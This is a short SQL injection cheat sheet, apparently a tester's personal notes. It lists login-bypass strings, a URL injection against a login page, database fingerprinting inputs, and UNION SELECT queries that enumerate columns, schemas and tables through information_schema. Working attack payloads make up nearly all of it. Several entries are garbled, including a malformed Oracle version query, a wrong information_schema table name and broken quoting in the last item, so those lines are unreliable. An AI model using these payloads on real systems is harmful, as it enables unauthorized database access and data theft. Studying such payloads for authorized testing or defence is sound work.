# Payload resource: https://github.com/swisskyrepo/PayloadsAllTheThings

### 1) Input box non-string

#### payload: 1 or 1=1-- -

### 2) Input box string

#### payload: 1' or '1'='1'-- -

### 3) URL injection

#### payload: http://site.com/sqli/login?profile=-1'or 1=1-- -&password=a

### 4) POST injection

#### Use proxy (Burp) or remove/disable JavaScript

## Database Identification

### 1) MySQL and MSSQL: 'nickname=@@version,email='

### 2) Oracle: 'nickname=(SELECT Gamer FROM v(version),email='

### 3) SQLite: 'nickname=sqlite_version(),email='

## Database enumeration:

### Columns enumeration:

#### 1' UNION SELECT NULL-- -

#### 1' UNION SELECT NULL,NULL-- -

## TIP:

#### Keep adding NULL until you see an error. The last correct query reveals the amount of columns in the database.

## group_concat(table_name)

## Manual Enumeration

#### 1) ' (Error Based)

#### 2) '1 order by (num)' (column enumeration)

#### 3) '1 UNION SELECT database()'

#### 4) '1 UNION SELECT concat(schema_name)' from information_schema.schema'

#### 5) '1 UNION SELECT table_name from information_schema.tables WHERE table_schema = database()'

#### 6) '1 UNION SELECT 1, concat(+1," ",+2, " ",+3),3,4 from "name"
